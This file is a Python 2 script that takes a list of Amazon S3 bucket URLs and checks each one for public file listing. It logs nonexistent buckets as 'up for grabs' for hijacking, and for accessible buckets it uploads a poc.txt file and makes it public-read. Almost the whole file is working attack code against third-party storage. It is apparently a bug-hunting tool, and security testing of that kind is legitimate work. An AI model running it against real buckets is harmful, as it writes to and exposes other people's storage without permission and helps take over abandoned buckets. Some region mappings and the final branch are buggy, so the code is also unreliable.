import os 
import boto
import boto.s3.connection
from boto.s3.key import Key
import requests

fname = "list.txt"


def check_listings (url):
	try:
		session = requests.Session()
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
		response = session.get("http://"+url+"", headers=headers)
		if "<ListBucketResult xmlns" in response.content:
			write_listable (url)
			print ("[*] S3 Bucket Lists Files [*]")
			return True
		if "Code: NoSuchBucket" in response.content:
			write_buckets_upforgrabs (url)
			return False
		if response.status_code == 403:
			return True
	except Exception,e:
		print str(e)
		pass
		


def write_buckets_upforgrabs (url):
	text_file = open("buckets-nosuchbucket.txt", "a")
	text_file.write("[*] Bucket Up for Grabs http://"+url+" [*]\n")
	text_file.close()
	#print ("[*]Bucket for Hijacking[*]")

def check_upload (bucket,url,region):

	try:

		conn = boto.s3.connect_to_region(region,
		aws_access_key_id = 'AWS_ACCESS_KEY',
		aws_secret_access_key = 'AWS_SECRET_ACCESS_KEY',
		# host = 's3-website-us-east-1.amazonaws.com',
		# is_secure=True,               # uncomment if you are not using ssl
		calling_format = boto.s3.connection.OrdinaryCallingFormat(),
		)

		bucket = conn.get_bucket(bucket)
		key_name = 'poc.txt'
		path = '/' #Directory Under which file should get upload
		full_key_name = os.path.join(path, key_name)
		k = bucket.new_key(full_key_name)
		k.set_contents_from_filename(key_name)
		hello_key = bucket.get_key('poc.txt')
		hello_key.set_canned_acl('public-read')
		write_uploadable (url)

	except Exception,e:
		print str(e)
		pass

def write_listable (url):

	text_file = open("buckets-list.txt", "a")
	text_file.write("[*] File Listings Enabled on: http://"+url+" [*]\n")
	text_file.close()
	print ("[*]Directory Listings Enabled[*]")

def write_uploadable (url):
	text_file = open("buckets-upload.txt", "a")
	text_file.write("[*] POC uploaded: http://"+url+"/poc.txt [*]\n")
	text_file.close()
	print ("[*]Poc Uploaded![*]")



with open(fname) as f:
	for line in f:
		url = line.replace("\n","")
		if 's3-website-us-east-1' in url:
			bucket = url.split(".s3-website-us-east-1")
			region = "us-east-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
		if 's3.us-east-2.amazonaws.com' in url:
			bucket = url.split(".s3.us-east-2.amazonaws.com")
			region = "us-east-2"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.amazonaws.com' in url:
			bucket = url.split(".s3.amazonaws.com")
			region = "us-east-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.us-west-1.amazonaws.com' in url:
			bucket = url.split(".s3.us-west-1.amazonaws.com")
			region = "us-west-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.us-west-2.amazonaws.com' in url:
			bucket = url.split(".s3.us-west-2.amazonaws.com")
			region = "us-west-2"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.ca-central-1.amazonaws.com' in url:
			bucket = url.split(".s3.ca-central-1.amazonaws.com")
			region = "ca-central-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
				
		if 's3.ap-south-1.amazonaws.com' in url:
			bucket = url.split(".s3.ap-south-1.amazonaws.com")
			region = "ap-southeast-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		
		if 's3.ap-southeast-1.amazonaws.com' in url:
			bucket = url.split(".s3.ap-southeast-1.amazonaws.com")
			region = "ap-southeast-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.ap-southeast-2.amazonaws.com' in url:
			bucket = url.split(".s3.ap-southeast-2.amazonaws.com")
			region = "ap-southeast-2"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.ap-northeast-1.amazonaws.com' in url:
			bucket = url.split(".s3.ap-northeast-1.amazonaws.com")
			region = "ap-northeast-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.eu-central-1.amazonaws.com' in url:
			bucket = url.split(".s3.eu-central-1.amazonaws.com")
			region = "eu-central-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.eu-west-1.amazonaws.com' in url:
			bucket = url.split(".s3.eu-west-1.amazonaws.com")
			region = "eu-west-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.eu-west-2.amazonaws.com' in url:
			bucket = url.split(".s3.eu-west-2.amazonaws.com")
			region = "eu-west-2"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3.sa-east-1.amazonaws.com' in url:
			bucket = url.split(".s3.sa-east-1.amazonaws.com")
			region = "sa-east-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3-us-west-2' in url:
			bucket = url.split(".s3-us-west-2.amazonaws.com")
			region = "us-west-2"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3-website-ap-northeast' in url:
			bucket = url.split(".s3-website-ap-northeast-1.amazonaws.com")
			region = "ap-northeast-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		if 's3-website-us-west-2' in url:
			bucket = url.split(".s3-website-us-west-2.amazonaws.com")
			region = "us-west-2"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
				
	else:
		
		if 's3.amazonaws.com' in url:
			bucket = url
			region = "us-east-1"
			print ("[*]Bucket: "+bucket[0]+"[*]")
			if check_listings (url) == True:
				check_upload (bucket[0],url,region)
				
		
				
		
				
				
				
				
				
		
			
			
